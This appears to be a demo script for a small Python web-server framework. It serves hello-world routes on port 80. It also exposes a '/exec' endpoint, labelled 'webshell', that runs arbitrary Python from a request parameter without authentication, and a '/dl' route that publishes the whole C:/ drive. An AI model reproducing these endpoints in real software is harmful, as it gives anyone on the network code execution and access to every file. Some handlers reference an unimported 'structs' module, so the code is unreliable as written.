from lightning import Node, Request, Response, Server, Folder, Interface

# author: 程鹏博 景炎 2010
# date 2021-4-9
a = Server(('', 80), max_thread = 8)
print(f'You can visit this server at {a.addr}')


@a.bind('/test')
def hello_world(request: Request) -> Response:
    s = f'hello world! from {request.addr}'
    return structs.Response(content = s)


@a.bind('/raw_test')
def raw_hello(request: Request):
    s = f'hello world! from {request.addr}'
    request.conn.sendall(Response(content = s).generate())


test = Node()


@test.bind('/test')
def hello_world(request: Request) -> Response:
    s = f'hello world! from {request.addr}'
    return Response(content = s)


@test.bind('/raw_test')
def raw_hello(request: Request):
    s = f'hello world! from {request.addr}'
    request.conn.sendall(Response(content = s).generate())


@a.bind('/exec')
def shell(request: Request):
    command = compile(request.keyword['stmt'], 'webshell', 'single')
    exec(command)
    return structs.Response(content = 'Success')


a.bind('/t', test)
a.bind('/dl', Folder('C:/'))
a.run()
